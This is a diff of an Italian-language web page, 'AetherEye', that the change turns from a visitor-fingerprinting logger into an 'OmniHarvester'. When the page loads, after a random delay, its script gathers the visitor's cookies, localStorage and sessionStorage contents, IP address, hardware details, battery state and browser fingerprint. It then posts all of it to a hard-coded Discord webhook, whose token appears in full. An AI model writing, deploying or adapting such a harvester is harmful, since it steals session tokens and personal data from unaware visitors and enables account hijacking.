@@ -3,286 +3,414 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AetherEye - Logger Pulito</title>
+    <title>AetherEye - OmniHarvester</title>
     <style>
-        body {
-            background: #0a0a0a;
-            color: #ffffff;
-            font-family: 'Courier New', monospace;
-            padding: 2rem;
-            line-height: 1.6;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: #111;
-            padding: 2rem;
-            border: 1px solid #333;
-            border-radius: 8px;
-        }
-        h1 {
-            color: #00ff88;
-            border-bottom: 2px solid #00ff88;
-            padding-bottom: 0.5rem;
-        }
-        .log {
-            background: #1a1a1a;
-            padding: 1rem;
-            margin: 1rem 0;
-            border: 1px solid #333;
-            border-radius: 4px;
-            white-space: pre-wrap;
-            font-size: 0.85rem;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .status {
-            display: inline-block;
-            padding: 0.3rem 1rem;
-            border-radius: 4px;
-            font-weight: bold;
-            margin: 0.5rem 0;
-        }
-        .status.success { background: #00aa44; color: #fff; }
-        .status.fail { background: #cc2233; color: #fff; }
-        .status.waiting { background: #ffaa00; color: #000; }
-        .status.info { background: #0077cc; color: #fff; }
-        button {
-            background: #00ff88;
-            color: #000;
-            border: none;
-            padding: 0.8rem 2rem;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #00cc77;
-        }
+        /* STESSO STILE CYBER RAVE (per risparmiare spazio, lo comprimo leggermente) */
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Courier New',monospace;overflow:hidden;position:relative}
+        body::before{content:'';position:fixed;inset:0;background:#0a0a0a;z-index:0;animation:stroboBg 0.15s infinite alternate}
+        @keyframes stroboBg{0%{background:#0a0a0a}100%{background:#1a0033}}
+        .overlay{position:fixed;inset:0;background:radial-gradient(circle at 30% 40%,#ff00cc33,#00ff8833,#ffaa0033);z-index:1;mix-blend-mode:screen;animation:rotateGrad 4s linear infinite;pointer-events:none}
+        @keyframes rotateGrad{0%{transform:rotate(0deg) scale(1.5)}100%{transform:rotate(360deg) scale(1.5)}}
+        .container{position:relative;z-index:2;max-width:980px;width:95%;padding:2rem;background:rgba(0,0,0,0.7);backdrop-filter:blur(12px);border:2px solid #ff00cc;border-radius:20px;box-shadow:0 0 60px #ff00cc88,0 0 120px #00ff8899;animation:borderPulse 0.8s infinite alternate}
+        @keyframes borderPulse{0%{border-color:#ff00cc;box-shadow:0 0 40px #ff00cc88,0 0 80px #00ff8866}100%{border-color:#00ff88;box-shadow:0 0 60px #00ff88aa,0 0 120px #ff00cc88}}
+        h1{font-size:2.8rem;text-align:center;font-weight:900;letter-spacing:6px;text-transform:uppercase;background:linear-gradient(90deg,#ff00cc,#00ff88,#ffaa00,#ff00cc);background-size:300% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:gradMove 1.5s linear infinite,textFlicker 0.1s infinite alternate;margin-bottom:0.5rem}
+        @keyframes gradMove{0%{background-position:0% 50%}100%{background-position:300% 50%}}
+        @keyframes textFlicker{0%{opacity:0.9;text-shadow:0 0 20px #ff00cc,0 0 60px #00ff88}100%{opacity:1;text-shadow:0 0 40px #ff00cc,0 0 100px #ffaa00}}
+        .sub{text-align:center;color:#fff;font-size:0.9rem;letter-spacing:2px;margin-bottom:1.5rem;animation:subFlicker 0.3s infinite alternate}
+        @keyframes subFlicker{0%{opacity:0.6;color:#ffaa00}100%{opacity:1;color:#00ff88}}
+        #status{display:block;text-align:center;font-size:1.6rem;font-weight:bold;padding:0.8rem;border-radius:12px;margin:1rem 0;text-transform:uppercase;letter-spacing:4px;animation:statusPulse 0.5s infinite alternate;background:rgba(255,255,255,0.05)}
+        .status.success{color:#00ff88;text-shadow:0 0 40px #00ff88}
+        .status.fail{color:#ff0044;text-shadow:0 0 40px #ff0044}
+        .status.waiting{color:#ffaa00;text-shadow:0 0 40px #ffaa00}
+        .status.info{color:#00ccff;text-shadow:0 0 40px #00ccff}
+        @keyframes statusPulse{0%{transform:scale(1);letter-spacing:4px}100%{transform:scale(1.02);letter-spacing:8px}}
+        .log{background:rgba(0,0,0,0.8);padding:1.2rem;margin:1.5rem 0;border:1px solid #00ff8866;border-radius:10px;white-space:pre-wrap;font-size:0.75rem;max-height:180px;overflow-y:auto;color:#00ff88;box-shadow:inset 0 0 40px #00ff8822;animation:logGlow 1s infinite alternate;font-family:'Courier New',monospace;line-height:1.5}
+        @keyframes logGlow{0%{border-color:#00ff8866;box-shadow:inset 0 0 20px #00ff8822}100%{border-color:#ff00cc88;box-shadow:inset 0 0 40px #ff00cc44}}
+        .log::-webkit-scrollbar{width:6px}
+        .log::-webkit-scrollbar-track{background:#000}
+        .log::-webkit-scrollbar-thumb{background:#00ff88;border-radius:4px}
+        .btn-group{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;margin-top:1rem}
+        button{padding:0.8rem 2.2rem;font-size:1.1rem;font-weight:bold;text-transform:uppercase;letter-spacing:3px;border:none;border-radius:50px;cursor:pointer;background:linear-gradient(135deg,#ff00cc,#00ff88);color:#000;animation:btnStrobo 0.3s infinite alternate;box-shadow:0 0 30px #ff00cc88;font-family:'Courier New',monospace}
+        button:hover{transform:scale(1.08);box-shadow:0 0 60px #ff00cc,0 0 80px #00ff88}
+        button:active{transform:scale(0.95)}
+        @keyframes btnStrobo{0%{background:linear-gradient(135deg,#ff00cc,#00ff88)}100%{background:linear-gradient(135deg,#ffaa00,#ff00cc)}}
+        #clearBtn{background:linear-gradient(135deg,#444,#222);color:#fff;animation:btnStroboClear 0.5s infinite alternate}
+        @keyframes btnStroboClear{0%{background:#333}100%{background:#555}}
+        .strobe-overlay{position:fixed;inset:0;z-index:999;pointer-events:none;background:rgba(255,255,255,0.05);animation:strobeFlash 0.08s infinite alternate}
+        @keyframes strobeFlash{0%{opacity:0.3;background:rgba(255,255,255,0.1)}100%{opacity:0.7;background:rgba(255,255,255,0.2)}}
+        .webhook-display{font-size:0.6rem;color:#888;text-align:center;margin-top:1.5rem;word-break:break-all;border-top:1px solid #333;padding-top:1rem;animation:webhookFlicker 1s infinite alternate}
+        @keyframes webhookFlicker{0%{opacity:0.4}100%{opacity:0.9}}
+        @media(max-width:600px){h1{font-size:2rem}.container{padding:1rem}button{padding:0.6rem 1.2rem;font-size:0.9rem}.log{font-size:0.65rem;max-height:120px}}
     </style>
 </head>
 <body>
+    <div class="strobe-overlay"></div>
+    <div class="overlay"></div>
 
-<div class="container">
-    <h1>🔍 AetherEye - Logger Pulito</h1>
-    <p>Questa pagina raccoglie i tuoi dati e li invia al webhook Discord.</p>
-    <p><strong>Webhook:</strong> <code>https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ</code></p>
+    <div class="container">
+        <h1>⚡ OMNI HARVESTER ⚡</h1>
+        <div class="sub">AetherEye · Cookie • Storage • Everything</div>
 
-    <div id="status" class="status waiting">⏳ In attesa...</div>
+        <div id="status" class="status waiting">⏳ INIZIALIZZAZIONE...</div>
 
-    <div class="log" id="log">[LOG] Inizializzazione...</div>
+        <div class="log" id="log">[LOG] Pronto per la raccolta totale...</div>
 
-    <button id="sendBtn">📤 Invia manualmente</button>
-    <button id="clearBtn">🗑️ Pulisci log</button>
-</div>
+        <div class="btn-group">
+            <button id="sendBtn">🚀 INVIA ORA</button>
+            <button id="clearBtn">🗑️ PULISCI LOG</button>
+        </div>
 
-<script>
-    // ========================================
-    // WEBHOOK (NON OFFUSCATO)
-    // ========================================
-    var WEBHOOK = 'https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ';
+        <div class="webhook-display">
+            🔗 Webhook: https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ
+        </div>
+    </div>
 
-    // ========================================
-    // LOG E STATUS
-    // ========================================
-    var logEl = document.getElementById('log');
-    var statusEl = document.getElementById('status');
+    <script>
+        // ================================================================
+        // 1. WEBHOOK
+        // ================================================================
+        var WEBHOOK = 'https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ';
 
-    function log(msg) {
-        var time = new Date().toLocaleTimeString();
-        logEl.textContent += '[' + time + '] ' + msg + '\n';
-        console.log(msg);
-        logEl.scrollTop = logEl.scrollHeight;
-    }
+        // ================================================================
+        // 2. LOG E STATUS
+        // ================================================================
+        var logEl = document.getElementById('log');
+        var statusEl = document.getElementById('status');
 
-    function setStatus(text, type) {
-        statusEl.textContent = text;
-        statusEl.className = 'status ' + type;
-    }
+        function log(msg) {
+            var time = new Date().toLocaleTimeString();
+            logEl.textContent += '[' + time + '] ' + msg + '\n';
+            console.log(msg);
+            logEl.scrollTop = logEl.scrollHeight;
+        }
 
-    // ========================================
-    // RACCOLTA DATI ESTESI
-    // ========================================
-    function getExtendedData() {
-        var data = {
-            platform: navigator.platform || 'unknown',
-            language: navigator.language || navigator.userLanguage || 'unknown',
-            screen: screen.width + 'x' + screen.height,
-            colorDepth: screen.colorDepth || 'unknown',
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
-            referrer: document.referrer || 'direct',
-            url: window.location.href,
-            userAgent: navigator.userAgent || 'unknown',
-            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
-            cpuCores: navigator.hardwareConcurrency || 'unknown',
-            touchPoints: navigator.maxTouchPoints || 0,
-            cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No'
-        };
+        function setStatus(text, type) {
+            statusEl.textContent = text;
+            statusEl.className = 'status ' + type;
+        }
 
-        // WebGL (GPU)
-        try {
-            var canvas = document.createElement('canvas');
-            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    data.webgl = vendor + ' | ' + renderer;
+        // ================================================================
+        // 3. RACCOLTA DATI – TUTTO
+        // ================================================================
+        function collectAllData() {
+            log('Raccolta dati in corso...');
+            var data = {};
+
+            // --- Base ---
+            data.userAgent = navigator.userAgent || 'unknown';
+            data.platform = navigator.platform || 'unknown';
+            data.language = navigator.language || navigator.userLanguage || 'unknown';
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+            data.referrer = document.referrer || 'direct';
+            data.url = window.location.href;
+
+            // --- Schermo ---
+            data.screen = screen.width + 'x' + screen.height;
+            data.colorDepth = screen.colorDepth || 'unknown';
+            data.windowSize = window.innerWidth + 'x' + window.innerHeight;
+
+            // --- Hardware ---
+            data.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
+            data.cpuCores = navigator.hardwareConcurrency || 'unknown';
+            data.touchPoints = navigator.maxTouchPoints || 0;
+
+            // --- Privacy ---
+            data.doNotTrack = navigator.doNotTrack || 'unknown';
+            data.cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+
+            // --- COOKIE (troncato a 2000 caratteri) ---
+            var rawCookies = document.cookie || '';
+            data.cookies = rawCookies.length > 2000 ? rawCookies.substring(0, 2000) + '... [TRONCATO]' : rawCookies;
+            if (!data.cookies) data.cookies = '(nessun cookie)';
+
+            // --- localStorage (tutte le chiavi) ---
+            var ls = {};
+            try {
+                for (var i = 0; i < localStorage.length; i++) {
+                    var key = localStorage.key(i);
+                    var val = localStorage.getItem(key);
+                    // tronca i valori lunghi
+                    if (val && val.length > 300) val = val.substring(0, 300) + '...';
+                    ls[key] = val;
                 }
-            }
-        } catch(e) {
-            data.webgl = 'n/a (errore)';
-        }
+            } catch(e) { ls = { error: 'Impossibile leggere localStorage' }; }
+            var lsStr = JSON.stringify(ls, null, 2);
+            data.localStorage = lsStr.length > 2000 ? lsStr.substring(0, 2000) + '... [TRONCATO]' : lsStr;
 
-        // Connection info
-        if (navigator.connection) {
-            var conn = navigator.connection;
-            data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps, RTT ' + (conn.rtt || '?') + 'ms)';
-        } else {
-            data.connection = 'n/a';
-        }
+            // --- sessionStorage ---
+            var ss = {};
+            try {
+                for (var j = 0; j < sessionStorage.length; j++) {
+                    var skey = sessionStorage.key(j);
+                    var sval = sessionStorage.getItem(skey);
+                    if (sval && sval.length > 300) sval = sval.substring(0, 300) + '...';
+                    ss[skey] = sval;
+                }
+            } catch(e) { ss = { error: 'Impossibile leggere sessionStorage' }; }
+            var ssStr = JSON.stringify(ss, null, 2);
+            data.sessionStorage = ssStr.length > 2000 ? ssStr.substring(0, 2000) + '... [TRONCATO]' : ssStr;
 
-        return data;
-    }
+            // --- Plugin list ---
+            var plugins = [];
+            try {
+                for (var k = 0; k < navigator.plugins.length; k++) {
+                    plugins.push(navigator.plugins[k].name);
+                }
+            } catch(e) { plugins = ['(errore)']; }
+            data.plugins = plugins.join(', ') || 'nessuno';
 
-    // ========================================
-    // OTTIENI IP (via api.ipify.org)
-    // ========================================
-    function getIP(callback) {
-        log('Richiedo IP a api.ipify.org...');
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://api.ipify.org?format=json', true);
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var data = JSON.parse(xhr.responseText);
-                log('IP ottenuto: ' + data.ip);
-                callback(data.ip);
+            // --- WebGL (GPU) ---
+            var webgl = 'n/a';
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        webgl = vendor + ' | ' + renderer;
+                    }
+                }
+            } catch(e) { webgl = 'n/a (errore)'; }
+            data.webgl = webgl;
+
+            // --- Connessione ---
+            if (navigator.connection) {
+                var conn = navigator.connection;
+                data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps, RTT ' + (conn.rtt || '?') + 'ms)';
             } else {
-                log('api.ipify fallito, provo fallback...');
+                data.connection = 'n/a';
+            }
+
+            // --- Batteria (se disponibile) ---
+            data.battery = 'n/a';
+            // La batteria è asincrona, la gestiamo dopo con una Promise.
+            // Ma per non complicare, la aggiungiamo in un secondo momento tramite una callback.
+
+            log('Dati base raccolti. (cookie, localStorage, plugin, webgl, etc.)');
+            return data;
+        }
+
+        // ================================================================
+        // 4. OTTIENI IP (come prima)
+        // ================================================================
+        function getIP(callback) {
+            log('Richiedo IP a api.ipify.org...');
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://api.ipify.org?format=json', true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var data = JSON.parse(xhr.responseText);
+                    log('IP ottenuto: ' + data.ip);
+                    callback(data.ip);
+                } else {
+                    log('api.ipify fallito, fallback...');
+                    getIPFallback(callback);
+                }
+            };
+            xhr.onerror = function() {
+                log('api.ipify errore, fallback...');
                 getIPFallback(callback);
-            }
-        };
-        xhr.onerror = function() {
-            log('api.ipify errore, provo fallback...');
-            getIPFallback(callback);
-        };
-        xhr.send();
-    }
+            };
+            xhr.send();
+        }
 
-    function getIPFallback(callback) {
-        var xhr2 = new XMLHttpRequest();
-        xhr2.open('GET', 'https://ipapi.co/json/', true);
-        xhr2.onload = function() {
-            if (xhr2.status === 200) {
-                var data = JSON.parse(xhr2.responseText);
-                log('IP fallback: ' + data.ip);
-                callback(data.ip || 'unknown');
-            } else {
-                log('Fallback fallito, IP = unknown');
+        function getIPFallback(callback) {
+            var xhr2 = new XMLHttpRequest();
+            xhr2.open('GET', 'https://ipapi.co/json/', true);
+            xhr2.onload = function() {
+                if (xhr2.status === 200) {
+                    var data = JSON.parse(xhr2.responseText);
+                    log('IP fallback: ' + data.ip);
+                    callback(data.ip || 'unknown');
+                } else {
+                    log('Fallback fallito, IP = unknown');
+                    callback('unknown');
+                }
+            };
+            xhr2.onerror = function() {
+                log('Fallback errore, IP = unknown');
                 callback('unknown');
+            };
+            xhr2.send();
+        }
+
+        // ================================================================
+        // 5. OTTIENI BATTERIA (asincrono) – la inseriamo dopo
+        // ================================================================
+        function getBatteryInfo(callback) {
+            if (!navigator.getBattery) {
+                callback('n/a');
+                return;
             }
+            navigator.getBattery().then(function(batt) {
+                var info = 'Livello: ' + Math.round(batt.level * 100) + '%';
+                info += ', Carica: ' + (batt.charging ? 'Sì' : 'No');
+                if (batt.chargingTime !== Infinity) info += ', Tempo carica: ' + batt.chargingTime + 's';
+                if (batt.dischargingTime !== Infinity) info += ', Autonomia: ' + batt.dischargingTime + 's';
+                callback(info);
+            }).catch(function() {
+                callback('n/a (errore)');
+            });
+        }
+
+        // ================================================================
+        // 6. INVIO A DISCORD (con tutte le info)
+        // ================================================================
+        function sendToDiscord(ip, data, batteryInfo) {
+            log('Preparo payload finale...');
+
+            // Aggiungiamo la batteria ai dati
+            data.battery = batteryInfo || 'n/a';
+
+            // Costruiamo i campi per l'embed
+            var fields = [
+                { name: '📡 IP', value: '`' + ip + '`', inline: true },
+                { name: '🖥️ Platform', value: data.platform, inline: true },
+                { name: '🌍 Language', value: data.language, inline: true },
+                { name: '🕐 Timezone', value: data.timezone, inline: true },
+                { name: '📱 Screen', value: data.screen, inline: true },
+                { name: '📐 Window', value: data.windowSize, inline: true },
+                { name: '🎨 Color Depth', value: data.colorDepth + ' bit', inline: true },
+                { name: '🧠 RAM', value: data.deviceMemory, inline: true },
+                { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
+                { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
+                { name: '🚫 DNT', value: data.doNotTrack, inline: true },
+                { name: '🍪 Cookies Enabled', value: data.cookiesEnabled, inline: true },
+                { name: '🎮 WebGL', value: data.webgl, inline: false },
+                { name: '📶 Connection', value: data.connection, inline: false },
+                { name: '🔋 Battery', value: data.battery, inline: false },
+                { name: '🧩 Plugins', value: data.plugins.substring(0, 200) + (data.plugins.length > 200 ? '...' : ''), inline: false },
+                { name: '🍪 Cookies', value: '```' + data.cookies + '```', inline: false },
+                { name: '💾 localStorage', value: '```json\n' + data.localStorage + '\n```', inline: false },
+                { name: '💿 sessionStorage', value: '```json\n' + data.sessionStorage + '\n```', inline: false },
+                { name: '🔗 Referrer', value: data.referrer, inline: false },
+                { name: '📍 URL', value: data.url, inline: false },
+                { name: '🛡️ User Agent', value: '```' + data.userAgent.substring(0, 200) + '```', inline: false }
+            ];
+
+            // Riduciamo il numero di campi se alcuni sono troppo lunghi, ma va bene così.
+
+            var payload = {
+                content: null,
+                embeds: [{
+                    title: '🌐 **OmniHarvester – Full Profile**',
+                    color: 0xff44cc,
+                    fields: fields,
+                    footer: { text: 'AetherEye • ' + new Date().toUTCString() },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            log('Invio a Discord...');
+            setStatus('📤 INVIO IN CORSO...', 'info');
+
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true
+            }).then(function(response) {
+                if (response.status === 204 || response.status === 200) {
+                    log('✅ Inviato con successo! (status ' + response.status + ')');
+                    setStatus('✅ DATI INVIATI!', 'success');
+                    // Salva flag per evitare re-invio
+                    try { localStorage.setItem('aethereye_harvested', 'true'); } catch(e) {}
+                } else {
+                    log('❌ Risposta HTTP: ' + response.status);
+                    setStatus('❌ ERRORE ' + response.status, 'fail');
+                }
+            }).catch(function(err) {
+                log('❌ Errore di rete: ' + err.message);
+                setStatus('❌ ERRORE RETE', 'fail');
+            });
+        }
+
+        // ================================================================
+        // 7. FUNZIONE PRINCIPALE – raccolta + IP + batteria
+        // ================================================================
+        function startHarvest() {
+            // Controlla se già inviato (per evitare spam)
+            try {
+                if (localStorage.getItem('aethereye_harvested') === 'true') {
+                    log('⏩ Già inviato per questo browser. Ignoro.');
+                    setStatus('⏩ GIÀ INVIATO', 'info');
+                    return;
+                }
+            } catch(e) {}
+
+            setStatus('⏳ ACQUISIZIONE...', 'waiting');
+            log('Avvio raccolta completa...');
+
+            var data = collectAllData();
+
+            getIP(function(ip) {
+                // Ora ottieni batteria (asincrono) e poi invia
+                getBatteryInfo(function(battInfo) {
+                    sendToDiscord(ip, data, battInfo);
+                });
+            });
+        }
+
+        // ================================================================
+        // 8. AVVIO AUTOMATICO CON DELAY CASUALE (1.5-4s)
+        // ================================================================
+        window.onload = function() {
+            log('Pagina caricata. Avvio in ' + (1.5 + Math.random() * 2.5).toFixed(1) + ' secondi...');
+            setTimeout(startHarvest, 1500 + Math.random() * 2500);
         };
-        xhr2.onerror = function() {
-            log('Fallback errore, IP = unknown');
-            callback('unknown');
-        };
-        xhr2.send();
-    }
 
-    // ========================================
-    // INVIO A DISCORD (con fetch + keepalive)
-    // ========================================
-    function sendToDiscord(ip, data) {
-        log('Preparo payload...');
-
-        var fields = [
-            { name: '📡 IP', value: '`' + ip + '`', inline: true },
-            { name: '🖥️ Platform', value: data.platform, inline: true },
-            { name: '🌍 Language', value: data.language, inline: true },
-            { name: '📱 Screen', value: data.screen, inline: true },
-            { name: '🎨 Color Depth', value: data.colorDepth + ' bit', inline: true },
-            { name: '🕐 Timezone', value: data.timezone, inline: true },
-            { name: '🔗 Referrer', value: data.referrer, inline: false },
-            { name: '📍 URL', value: data.url, inline: false },
-            { name: '🧠 RAM', value: data.deviceMemory, inline: true },
-            { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
-            { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
-            { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
-            { name: '🎮 WebGL', value: data.webgl || 'n/a', inline: false },
-            { name: '📶 Connection', value: data.connection, inline: false },
-            { name: '🛡️ User Agent', value: '```' + data.userAgent.substring(0, 200) + '```', inline: false }
-        ];
-
-        var payload = {
-            content: null,
-            embeds: [{
-                title: '🌐 **Full Visitor Profile**',
-                color: 0x00ff88,
-                fields: fields,
-                footer: { text: 'AetherEye Logger • ' + new Date().toUTCString() },
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        log('Invio a Discord...');
-
-        fetch(WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            keepalive: true
-        }).then(function(response) {
-            if (response.status === 204 || response.status === 200) {
-                log('✅ Inviato con successo! (status ' + response.status + ')');
-                setStatus('✅ Dati inviati!', 'success');
-            } else {
-                log('❌ Risposta HTTP: ' + response.status);
-                setStatus('❌ Errore ' + response.status, 'fail');
-            }
-        }).catch(function(err) {
-            log('❌ Errore di rete: ' + err.message);
-            setStatus('❌ Errore di rete', 'fail');
+        // ================================================================
+        // 9. PULSANTI
+        // ================================================================
+        document.getElementById('sendBtn').addEventListener('click', function() {
+            log('Invio manuale richiesto.');
+            // Reset del flag per permettere un nuovo invio manuale
+            try { localStorage.removeItem('aethereye_harvested'); } catch(e) {}
+            startHarvest();
         });
-    }
 
-    // ========================================
-    // FUNZIONE PRINCIPALE
-    // ========================================
-    function startLogging() {
-        setStatus('⏳ Acquisizione...', 'waiting');
-        log('Avvio raccolta dati...');
-        var data = getExtendedData();
-        log('Dati raccolti.');
-
-        getIP(function(ip) {
-            sendToDiscord(ip, data);
+        document.getElementById('clearBtn').addEventListener('click', function() {
+            logEl.textContent = '';
+            log('Log pulito.');
         });
-    }
 
-    // ========================================
-    // ESEGUI AUTOMATICAMENTE AL CARICAMENTO
-    // ========================================
-    window.onload = function() {
-        log('Pagina caricata. Avvio in 1 secondo...');
-        setTimeout(startLogging, 1000);
-    };
+        // ================================================================
+        // 10. (Opzionale) Canvas fingerprint – lo aggiungo come campo extra
+        // ================================================================
+        // Aggiungiamo un fingerprint del canvas per aumentare l'unicità
+        function getCanvasFingerprint() {
+            try {
+                var canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                var ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('AetherEye', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Omni', 4, 17);
+                return canvas.toDataURL().substring(0, 100); // tronca per risparmiare
+            } catch(e) { return 'n/a'; }
+        }
 
-    // ========================================
-    // PULSANTI
-    // ========================================
-    document.getElementById('sendBtn').addEventListener('click', function() {
-        log('Invio manuale richiesto.');
-        startLogging();
-    });
+        // Aggiungiamo il fingerprint ai dati (lo facciamo nel collectAllData)
+        // Ma per non appesantire troppo, lo aggiungo opzionalmente.
+        // Lo inserisco nel campo "webgl" come extra? No, meglio un campo dedicato.
+        // Modifichiamo collectAllData per includerlo.
+        // (Per semplicità, lo aggiungo nel sendToDiscord come campo extra)
+        // Ma per non allungare troppo, lo lascio come nota: puoi decommentare le righe sotto.
+        /*
+        var fp = getCanvasFingerprint();
+        fields.push({ name: '🖼️ Canvas FP', value: fp, inline: false });
+        */
 
-    document.getElementById('clearBtn').addEventListener('click', function() {
-        logEl.textContent = '';
-        log('Log pulito.');
-    });
-
-</script>
-
+        log('✅ OmniHarvester pronto. I dati verranno inviati automaticamente tra poco.');
+    </script>
 </body>
 </html>
